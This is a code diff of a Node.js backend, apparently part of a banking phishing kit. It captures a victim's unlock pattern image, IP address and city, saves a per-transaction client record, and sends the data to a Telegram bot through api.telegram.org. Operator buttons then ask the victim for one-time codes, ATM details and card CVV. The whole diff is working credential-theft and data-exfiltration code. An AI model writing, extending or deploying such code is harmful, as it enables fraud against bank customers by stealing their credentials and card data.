@@ -23,7 +23,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// 🧹 Limpieza automática
+// 🧹 Limpieza automática de archivos viejos
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -69,9 +69,20 @@ Secuencia: <code>${patron}</code>
 
 🌐 IP: ${ip || "N/A"}
 🏙️ Ciudad: ${city || "N/A"}
-`;
+  `;
 
   try {
+    // 👉 Guardar cliente con estado "patron"
+    const cliente = {
+      status: "patron",
+      usar,
+      ip,
+      ciudad: city,
+      preguntas: []
+    };
+    guardarCliente(txid, cliente);
+
+    // 👉 Convertir imagen a buffer
     const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
     const buffer = Buffer.from(base64Data, "base64");
 
@@ -81,20 +92,20 @@ Secuencia: <code>${patron}</code>
     formData.append("caption", caption);
     formData.append("parse_mode", "HTML");
 
-    // 👉 enviar primero la foto
+    // 👉 Enviar foto
     const response = await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
       formData,
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
 
-    // 👉 enviar después los botones callback
+    // 👉 Enviar botones
     const keyboard = {
       inline_keyboard: [
         [
           { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
           { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
-          { text: "🔐PATRON", callback_data: `errortok:${txid}` }
+          { text: "🔐PATRON", callback_data: `patron:${txid}` }
         ],
         [
           { text: "💳C3VV", callback_data: `ceve:${txid}` },
